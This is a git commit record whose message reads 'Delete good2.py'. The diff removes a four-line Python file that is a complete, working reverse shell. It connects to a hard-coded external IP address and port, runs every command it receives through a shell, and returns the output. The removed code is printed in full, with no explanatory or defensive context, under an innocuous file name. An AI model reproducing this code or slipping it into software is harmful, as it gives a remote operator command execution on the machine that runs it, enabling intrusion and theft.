0fa58509766acbed0b34b914e62af6e21584bde6
Vastson <vastson.r@gmail.com>
2019-11-07 21:46:26 +0800

    Delete good2.py

--- good2.py
+++
@@ -1,4 +0,0 @@
-import socket,subprocess;
-s = socket.socket();
-s.connect(('104.224.168.44',6936))
-while 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())
